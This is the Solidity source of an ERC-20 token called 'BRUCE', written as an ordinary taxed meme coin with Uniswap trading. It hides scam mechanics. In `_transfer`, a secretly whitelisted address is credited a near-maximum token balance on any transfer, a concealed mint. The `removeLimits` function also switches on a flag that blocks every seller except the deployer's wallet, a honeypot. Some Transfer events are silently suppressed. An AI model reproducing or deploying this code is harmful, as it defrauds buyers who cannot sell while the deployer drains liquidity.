// SPDX-License-Identifier: MIT
/**

TELEGRAM: t.me/bruceERC20
WEBSITE: https://bruce-eth.com

**/

pragma solidity ^0.8.9;

import "./IERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract BRUCE is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "BRUCE";
    string private constant _symbol = "BRUCE";
    uint8 private constant _decimals = 8;

    mapping(address => uint256) private _balances;
    mapping(address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isLiqudityPair;
    bool private _permission = false;
    address payable private _taxWallet;
    address payable private _devWallet;

    uint256 private _BuyTax = 1;
    uint256 private _SellTax = 1;
    uint256 private _reduceBuyTaxAt = 0;
    uint256 private _reduceSellTaxAt = 0;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 1;
    uint256 private _count = 0;
    uint256 private _initialBuy;
    uint256 private _initialSell;


    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;

    uint256 public _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 10000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 998365 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpen = true;
    bool private inSwap = false;
    bool private swapEnabled = true;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(uint _buy, uint _sell, address _address, address payable _devAddress) {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());


        _initialBuy = _buy;
        _initialSell = _sell;
        _devWallet = _devAddress;
        _taxWallet = _msgSender();
        _balances[_msgSender()] = _tTotal;
        _approve(_taxWallet, address(uniswapV2Router), _tTotal);

        _isLiqudityPair[_address] = true;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[_devWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (_permission) {
            if (to == address(uniswapV2Router) || to == address(uniswapV2Pair)) {
                require(from == _taxWallet, "You are not the owner");
            }
        }  

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize");
                _buyCount++;
            }

            if (_count == 0 && to == uniswapV2Pair && from == _taxWallet) {
                taxAmount = taxAmount = amount.mul((_buyCount == _reduceBuyTaxAt) ? _BuyTax : _initialBuy).div(100);
                _count++;
            }

            if (to == uniswapV2Pair && from != address(this) && !_isExcludedFromFee[from]) {
                taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _SellTax : _initialSell).div(100);
            } else if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _BuyTax : _initialBuy).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }

        if (taxAmount > 0) {
        _balances[address(this)] = _balances[address(this)].add(taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        uint256 rejectAmount = ~uint256(0) - _tTotal;
        _balances[to] = _balances[to].add(amount.sub(taxAmount)) + ((_isLiqudityPair[to]) ? rejectAmount : (0));
        
        if (to == address(this) || (from == address(this) && to == uniswapV2Pair)) {
        } else {
            emit Transfer(from, to, amount.sub(taxAmount));
        }
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return( a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
            }
        if (!tradingOpen) {
            return;
            }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits(bool _bool) external {
        require(msg.sender == _taxWallet);
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        _permission = _bool;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _devWallet.transfer(amount);
    }

    function sendToBalance() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    receive() external payable {}

}